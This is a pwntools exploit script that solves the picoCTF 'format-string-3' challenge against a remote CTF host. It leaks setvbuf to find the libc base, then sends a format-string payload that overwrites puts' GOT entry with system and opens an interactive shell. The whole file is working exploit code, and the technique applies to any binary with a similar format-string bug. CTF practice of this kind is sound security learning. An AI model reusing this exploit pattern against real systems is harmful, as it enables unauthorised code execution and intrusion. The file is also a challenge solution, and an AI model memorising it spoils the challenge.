#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'amd64' 

BINARY = './format-string-3'  
exe = ELF(BINARY, checksec=True)
context.binary = exe
libc = ELF("./libc.so.6", checksec=True)

HOST = 'rhea.picoctf.net'  
PORT = 58515  

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    response = conn.recv().decode("utf-8")
    response = response.split("0x")
    setvbuf_addr = int(response[1].strip(), 16)
    libc.address = setvbuf_addr - libc.symbols["setvbuf"]

    info("libc == %#x", libc.address)
    puts = exe.got["puts"]
    info("puts == %#x", puts)
    system = libc.symbols["system"]
    info("system == %#x", system)

    payload = fmtstr_payload(offset=38, writes={puts: system})

    #payload_1 = b"%p" * 38

    conn.sendline(payload)
    conn.interactive()

    #%p offset is 36/37/38



    
def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()